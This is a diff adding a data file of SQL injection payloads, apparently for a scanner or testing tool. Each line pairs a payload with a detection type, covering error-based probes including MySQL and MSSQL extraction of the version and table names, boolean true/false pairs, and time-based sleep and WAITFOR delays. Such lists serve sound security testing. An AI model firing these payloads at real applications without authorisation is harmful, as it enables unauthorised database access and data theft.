@@ -1,0 +1,30 @@
+# SQL Injection Payloads
+# Format: payload ||| detection_type ||| notes
+
+# --- Error-based ---
+'                                ||| error    ||| single quote
+''                               ||| error    ||| double single-quote
+`                                ||| error    ||| backtick (MySQL)
+')                               ||| error    ||| close paren
+' OR '1'='1                      ||| error    ||| classic OR
+' OR 1=1--                       ||| error    ||| comment terminator
+' OR 1=1#                        ||| error    ||| MySQL comment
+" OR "1"="1                      ||| error    ||| double-quote variant
+' AND EXTRACTVALUE(1,CONCAT(0x7e,VERSION()))-- ||| error ||| MySQL error extraction
+' AND 1=CONVERT(int,(SELECT TOP 1 table_name FROM information_schema.tables))-- ||| error ||| MSSQL error extraction
+
+# --- Boolean-based ---
+' AND '1'='1                     ||| boolean  ||| true condition
+' AND '1'='2                     ||| boolean  ||| false condition
+' AND 1=1--                      ||| boolean  ||| true with comment
+' AND 1=2--                      ||| boolean  ||| false with comment
+1 AND 1=1                        ||| boolean  ||| numeric true
+1 AND 1=2                        ||| boolean  ||| numeric false
+' OR 'x'='x                      ||| boolean  ||| always-true string
+' OR 'x'='y                      ||| boolean  ||| always-false string
+
+# --- Time-based (blind) ---
+'; WAITFOR DELAY '0:0:5'--       ||| time     ||| MSSQL 5s delay
+' OR SLEEP(5)--                  ||| time     ||| MySQL 5s delay
+' AND SLEEP(5)--                 ||| time     ||| MySQL AND delay
+'; SELECT pg_sleep(5)--          ||| time     ||| PostgreSQL 5s delay
